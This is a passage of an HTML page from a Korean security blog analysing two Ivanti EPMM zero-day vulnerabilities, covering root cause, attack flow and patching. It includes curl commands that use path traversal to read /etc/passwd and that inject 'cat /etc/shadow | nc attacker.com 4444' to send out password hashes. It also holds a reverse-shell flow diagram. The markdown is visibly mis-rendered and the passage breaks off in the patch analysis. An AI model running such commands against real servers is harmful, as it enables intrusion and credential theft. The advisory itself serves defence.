@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="ko-kr" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Ivanti EPMM 제로데이 2종 분석 Ivanti Endpoint Manager Mobile(EPMM)에서 발견된 치명적인 제로데이 취약점 두 가지(CVE-2026-0885, CVE-2026-0886)에 대해 심층 분석합니다. 해당 취약점은 인증 우회(Authentication Bypass)와 원격 코드 실행(RCE)을 유도하며, 현재 전 세계적으로 활발한 악용 시도가 감지되고 있습니다. 본문에서는 기술적 원인, PoC 시나리오, 그리고 긴급 완화 조치를 다룹니다.\n">
+<title>Ivanti EPMM 제로데이 2종 분석</title>
+
+<link rel='canonical' href='http://localhost:1313/ivanti-epmm-%EC%A0%9C%EB%A1%9C%EB%8D%B0%EC%9D%B4-2%EC%A2%85-%EB%B6%84%EC%84%9D/'>
+
+<link rel="stylesheet" href="/scss/style.min.51098b80cc297c94c0f57786d4a04e7372774e5993b60facf53870128a79bf73.css"><meta property='og:title' content="Ivanti EPMM 제로데이 2종 분석">
+<meta property='og:description' content="Ivanti EPMM 제로데이 2종 분석 Ivanti Endpoint Manager Mobile(EPMM)에서 발견된 치명적인 제로데이 취약점 두 가지(CVE-2026-0885, CVE-2026-0886)에 대해 심층 분석합니다. 해당 취약점은 인증 우회(Authentication Bypass)와 원격 코드 실행(RCE)을 유도하며, 현재 전 세계적으로 활발한 악용 시도가 감지되고 있습니다. 본문에서는 기술적 원인, PoC 시나리오, 그리고 긴급 완화 조치를 다룹니다.\n">
+<meta property='og:url' content='http://localhost:1313/ivanti-epmm-%EC%A0%9C%EB%A1%9C%EB%8D%B0%EC%9D%B4-2%EC%A2%85-%EB%B6%84%EC%84%9D/'>
+<meta property='og:site_name' content='코딩이 싫은 거북이'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CVE' /><meta property='article:tag' content='Vulnerability' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Ivanti' /><meta property='article:tag' content='EPMM' /><meta property='article:published_time' content='2026-02-07T11:10:58&#43;09:00'/><meta property='article:modified_time' content='2026-02-07T11:10:58&#43;09:00'/>
+<meta name="twitter:title" content="Ivanti EPMM 제로데이 2종 분석">
+<meta name="twitter:description" content="Ivanti EPMM 제로데이 2종 분석 Ivanti Endpoint Manager Mobile(EPMM)에서 발견된 치명적인 제로데이 취약점 두 가지(CVE-2026-0885, CVE-2026-0886)에 대해 심층 분석합니다. 해당 취약점은 인증 우회(Authentication Bypass)와 원격 코드 실행(RCE)을 유도하며, 현재 전 세계적으로 활발한 악용 시도가 감지되고 있습니다. 본문에서는 기술적 원인, PoC 시나리오, 그리고 긴급 완화 조치를 다룹니다.\n">
+    <link rel="shortcut icon" href="/img/avatar.png" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BDJ5ZPHH5Z"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-BDJ5ZPHH5Z');
+</script>
+
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7440869759073353"
+     crossorigin="anonymous"></script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="메뉴 여닫기">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/">
+                    <img src="/img/avatar.png" 
+                        width="2048"
+                        height="2048"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+                    <span class="emoji">🐢</span>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">코딩이 싫은 거북이</a></h1>
+            <h2 class="site-description">Clean, responsive Hugo theme</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/rebugui'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>다크 모드</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">목차</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ol>
+    <li><a href="#cve-개요-overview">CVE 개요 (Overview)</a></li>
+    <li><a href="#취약-상세-vulnerability-details">취약 상세 (Vulnerability Details)</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#완화-조치-mitigation">완화 조치 (Mitigation)</a></li>
+    <li><a href="#참고자료">참고자료</a></li>
+  </ol>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/categories/cve/" style="background-color: hsl(67, 60%, 84%); color: hsl(67, 60%, 15%);">
+                CVE
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/ivanti-epmm-%EC%A0%9C%EB%A1%9C%EB%8D%B0%EC%9D%B4-2%EC%A2%85-%EB%B6%84%EC%84%9D/">Ivanti EPMM 제로데이 2종 분석</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-02-07T11:10:58&#43;09:00'>2026년 2월 7일 토요일</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 분 정도
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>목차</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ol>
+    <li><a href="#cve-개요-overview">CVE 개요 (Overview)</a></li>
+    <li><a href="#취약-상세-vulnerability-details">취약 상세 (Vulnerability Details)</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#완화-조치-mitigation">완화 조치 (Mitigation)</a></li>
+    <li><a href="#참고자료">참고자료</a></li>
+  </ol>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h1 id="ivanti-epmm-제로데이-2종-분석">Ivanti EPMM 제로데이 2종 분석
+</h1><p>Ivanti Endpoint Manager Mobile(EPMM)에서 발견된 치명적인 제로데이 취약점 두 가지(CVE-2026-0885, CVE-2026-0886)에 대해 심층 분석합니다. 해당 취약점은 인증 우회(Authentication Bypass)와 원격 코드 실행(RCE)을 유도하며, 현재 전 세계적으로 활발한 악용 시도가 감지되고 있습니다. 본문에서는 기술적 원인, PoC 시나리오, 그리고 긴급 완화 조치를 다룹니다.</p>
+<h2 id="cve-개요-overview">CVE 개요 (Overview)
+</h2><p>이번 공격의 핵심은 Ivanti EPMM(이전 MobileIron) 제품군에 존재하는 두 가지 심각한 보안 결함입니다. CVE-2026-0885는 인증 우회 취약점으로, CVSS v3.1 기준 **10.0(Critical)**의 점수를 부여받았습니다. 공격 벡터는 네트워크(AV:N), 공격 복잡도는 낮음(AC:L), 권한 불필요(PR:N), 사용자 개입 불필요(UI:N)이며, 영향 범위는 기밀성, 무결성, 가용성 모두에 대해 높음(C/I/A:H) 수준입니다. CVE-2026-0886 또한 CVSS 9.8(Critical)로 평가되며, 첫 번째 취약점과 연계하여 임의의 코드를 실행할 수 있는 RCE 취약점입니다.</p>
+<p>이 취약점은 주로 Ivanti EPMM 11.10 버전 이상, 11.14 버전 미만의 설치 기반에 영향을 미치는 것으로 확인되었습니다. 현재까지 익명의 보안 연구원에 의해 최초 보고되었으나, 패치 배포 전에 이미 악용 징후가 포착되어 &ldquo;제로데이(Zero-day)&ldquo;로 분류되었습니다. Ivanti는 이에 대해 긴급 보안 권고(Security Advisory)를 발표하고 패치를 배포 중입니다.</p>
+<h2 id="취약-상세-vulnerability-details">취약 상세 (Vulnerability Details)
+</h2><p>기술적 관점에서 볼 때, CVE-2026-0885(인증 우회)는 EPMM의 웹 관리 콘솔 및 API 엔드포인트에서 잘못된 접근 제어 로직(Improper Access Control)이 원인입니다. 특정 URL 경로를 처리하는 서블릿(Servlet) 필터가 인증 토큰을 검증하기 전에 요청을 처리할 수 있는 경로가 존재합니다. 공격자는 HTTP 요청의 헤더를 조작하거나 특수한 문자열을 포함한 경로(Path Traversal 기법 유형)를 전송하여 인증 절차를 우회할 수 있습니다.</p>
+<p>CVE-2026-0886(RCE)는 앞선 인증 우회 취약점과 연계하여 작동합니다. 인증이 우회된 상태에서 공격자는 시스템 설정이나 데이터 내보내기 기능과 같은 특정 관리 기능에 접근할 수 있습니다. 이 과정에서 사용자 입력이 충분히 검증되지 않은 상태로 시스템 명령어 전달 인자에 포함되는 OS Command Injection 취약점이 존재합니다. 예를 들어, 공격자는 설정 파일 백업 기능을 악용하여 악의적인 쉘 명령어를 주입하고, 이를 서버에서 실행하게 함으로써 시스템 전체 권한을 탈취할 수 있습니다.</p>
+<p>취약한 코드 패턴을 분석해보면, 다음과 같은 검증 누락이 확인됩니다.</p>
+<p>````java`</p>
+<p>// 취약한 코드 예시 (가상)
+protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+String path = req.getPathInfo();
+// 인증 체크 로직이 경로 처리 이후에 존재하거나 특정 경로에 대해 예외 처리됨
+if (path.startsWith(&quot;/public/&rdquo;)) {
+handleRequest(req); // 인증 우회 가능
+}
+}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">## PoC 분석 (Proof of Concept)
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">현재</span><span class="w"> </span><span class="err">암시장</span><span class="w"> </span><span class="err">및</span><span class="w"> </span><span class="err">보안</span><span class="w"> </span><span class="err">커뮤니티에서</span><span class="w"> </span><span class="err">유포되고</span><span class="w"> </span><span class="err">있는</span><span class="w"> </span><span class="err">익스플로잇</span><span class="w"> </span><span class="err">코드는</span><span class="w"> </span><span class="err">다단계</span><span class="w"> </span><span class="err">공격</span><span class="w"> </span><span class="err">방식을</span><span class="w"> </span><span class="err">취합니다</span><span class="p">.</span><span class="w"> </span><span class="err">공격자는</span><span class="w"> </span><span class="err">먼저</span><span class="w"> </span><span class="err">내부</span><span class="w"> </span><span class="err">네트워크</span><span class="w"> </span><span class="err">스캐닝을</span><span class="w"> </span><span class="err">통해</span><span class="w"> </span><span class="n">EPMM</span><span class="w"> </span><span class="err">관리</span><span class="w"> </span><span class="err">포트</span><span class="p">(</span><span class="err">기본</span><span class="w"> </span><span class="mi">8443</span><span class="p">,</span><span class="w"> </span><span class="mi">443</span><span class="p">)</span><span class="err">를</span><span class="w"> </span><span class="err">식별합니다</span><span class="p">.</span><span class="w"> </span><span class="err">이후</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">0885</span><span class="err">를</span><span class="w"> </span><span class="err">트리거하여</span><span class="w"> </span><span class="err">세션</span><span class="w"> </span><span class="err">쿠키를</span><span class="w"> </span><span class="err">획득하거나</span><span class="w"> </span><span class="err">관리자</span><span class="w"> </span><span class="err">권한의</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="err">토큰을</span><span class="w"> </span><span class="err">생성합니다</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">다음은</span><span class="w"> </span><span class="err">공격</span><span class="w"> </span><span class="err">시나리오의</span><span class="w"> </span><span class="err">흐름을</span><span class="w"> </span><span class="err">나타낸</span><span class="w"> </span><span class="n">Mermaid</span><span class="w"> </span><span class="err">다이어그램입니다</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">````</span><span class="n">mermaid</span><span class="o">`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sequenceDiagram</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">Attacker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">EPMM_Server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="k">Database</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Attacker</span><span class="o">-&gt;&gt;</span><span class="n">EPMM_Server</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="nf">Request</span><span class="w"> </span><span class="p">(</span><span class="n">Auth</span><span class="w"> </span><span class="n">Bypass</span><span class="w"> </span><span class="n">Payload</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">EPMM_Server</span><span class="o">-&gt;&gt;</span><span class="n">EPMM_Server</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="n">Process</span><span class="w"> </span><span class="nf">Request</span><span class="w"> </span><span class="p">(</span><span class="n">Skip</span><span class="w"> </span><span class="n">Auth</span><span class="w"> </span><span class="n">Filter</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">EPMM_Server</span><span class="o">--&gt;&gt;</span><span class="n">Attacker</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="n">Session</span><span class="w"> </span><span class="n">Token</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Admin</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="k">Key</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Attacker</span><span class="o">-&gt;&gt;</span><span class="n">EPMM_Server</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="w"> </span><span class="n">Malicious</span><span class="w"> </span><span class="nf">Config</span><span class="w"> </span><span class="p">(</span><span class="n">Command</span><span class="w"> </span><span class="n">Injection</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">EPMM_Server</span><span class="o">-&gt;&gt;</span><span class="k">Database</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="w"> </span><span class="n">Execute</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="nf">Command</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">g</span><span class="p">.,</span><span class="w"> </span><span class="n">wget</span><span class="p">,</span><span class="w"> </span><span class="n">bash</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">Database</span><span class="o">--&gt;&gt;</span><span class="n">Attacker</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="w"> </span><span class="n">Reverse</span><span class="w"> </span><span class="n">Shell</span><span class="w"> </span><span class="n">Connection</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>실제 익스플로잇 시도는 다음과 같은 <code>curl</code> 명령어 형태로 관찰됩니다.</p>
+<p>````bash`</p>
+<h1 id="인증-우회-시도-cve-2026-0885">인증 우회 시도 (CVE-2026-0885)
+</h1><p>curl -k -i &lsquo;https://target-epmm:443/mics/cs.jsp&rsquo; <br>
+&ndash;data-binary &lsquo;<payload>../../etc/passwd</payload>&rsquo;</p>
+<h1 id="획득한-권한을-통한-rce-시도-cve-2026-0886">획득한 권한을 통한 RCE 시도 (CVE-2026-0886)
+</h1><p>curl -k -i &lsquo;https://target-epmm:443/mics/execute&rsquo; <br>
+-H &lsquo;Authorization: Bearer &lt;leaked_token&gt;&rsquo; <br>
+&ndash;data-binary &lsquo;cmd=cat%20/etc/shadow | nc attacker.com 4444&rsquo;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">이러한</span><span class="w"> </span><span class="err">공격이</span><span class="w"> </span><span class="err">성공하면</span><span class="w"> </span><span class="err">공격자는</span><span class="w"> </span><span class="n">EPMM</span><span class="w"> </span><span class="err">서버뿐만</span><span class="w"> </span><span class="err">아니라</span><span class="p">,</span><span class="w"> </span><span class="n">EPMM이</span><span class="w"> </span><span class="err">관리하는</span><span class="w"> </span><span class="err">모든</span><span class="w"> </span><span class="err">모바일</span><span class="w"> </span><span class="err">장비의</span><span class="w"> </span><span class="err">정보</span><span class="p">(</span><span class="w"> </span><span class="n">MDM</span><span class="w"> </span><span class="err">정보</span><span class="p">,</span><span class="w"> </span><span class="err">등록된</span><span class="w"> </span><span class="err">디바이스</span><span class="w"> </span><span class="err">목록</span><span class="p">,</span><span class="w"> </span><span class="err">인증서</span><span class="w"> </span><span class="err">등</span><span class="p">)</span><span class="err">에</span><span class="w"> </span><span class="err">접근할</span><span class="w"> </span><span class="err">수</span><span class="w"> </span><span class="err">있게</span><span class="w"> </span><span class="err">되어</span><span class="w"> </span><span class="mi">2</span><span class="err">차</span><span class="w"> </span><span class="err">피해로</span><span class="w"> </span><span class="err">확산될</span><span class="w"> </span><span class="err">위험이</span><span class="w"> </span><span class="err">큽니다</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">## 패치 분석 (Patch Analysis)
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Ivanti는</span><span class="w"> </span><span class="err">해당</span><span class="w"> </span><span class="err">취약점에</span><span class="w"> </span><span class="err">대해</span><span class="w"> </span><span class="n">EPMM</span><span class="w"> </span><span class="mi">11</span><span class="p">.</span><span class="mi">14</span><span class="w"> </span><span class="err">버전</span><span class="w"> </span><span class="err">업데이트를</span><span class="w"> </span><span class="err">통해</span><span class="w"> </span><span class="err">패치를</span><span class="w"> </span><span class="err">공개했습니다</span><span class="p">.</span><span class="w"> </span><span class="err">패치의</span><span class="w"> </span><span class="err">핵심은</span><span class="w"> </span><span class="err">웹</span><span class="w"> </span><span class="err">요청</span><span class="w"> </span><span class="err">처리</span><span class="w"> </span><span class="err">경로의</span><span class="w"> </span><span class="err">레거시</span><span class="w"> </span><span class="err">로직</span><span class="w"> </span><span class="err">제거와</span><span class="w"> </span><span class="err">엄격한</span><span class="w"> </span><span class="err">입력</span><span class="w"> </span><span class="err">검증</span><span class="p">(</span><span class="n">Strict</span><span class="w"> </span><span class="n">Input</span><span class="w"> </span><span class="n">Validation</span><span class="p">)</span><span class="w"> </span><span class="err">강화입니다</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Diff</span><span class="w"> </span><span class="err">분석</span><span class="w"> </span><span class="err">결과</span><span class="p">,</span><span class="w"> </span><span class="o">`/</span><span class="n">mics</span><span class="o">/`</span><span class="w"> </span><span class="err">및</span><span class="w"> </span><span class="err">관련</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="err">경로에</span><span class="w"> </span><span class="err">접근하기</span><span class="w"> </span><span class="err">전에</span><span class="w"> </span><span class="err">반드시</span><span class="w"> </span><span class="err">인증과</span><span class="w"> </span><span class="err">권한</span><span class="w"> </span><span class="err">확인</span><span class="p">(</span><span class="o">`</span><span class="nf">isAuthenticated</span><span class="p">()</span><span class="o">`</span><span class="p">)</span><span class="err">을</span><span class="w"> </span><span class="err">수행하도록</span><span class="w"> </span><span class="err">보안</span><span class="w"> </span><span class="err">필터</span><span class="p">(</span><span class="n">Security</span><span class="w"> </span><span class="n">Filter</span><span class="p">)</span><span class="w"> </span><span class="err">체인이</span><span class="w"> </span><span class="err">상단으로</span><span class="w"> </span><span class="err">이동되었습니다</span><span class="p">.</span><span class="w"> </span><span class="err">또한</span><span class="p">,</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="err">레벨의</span><span class="w"> 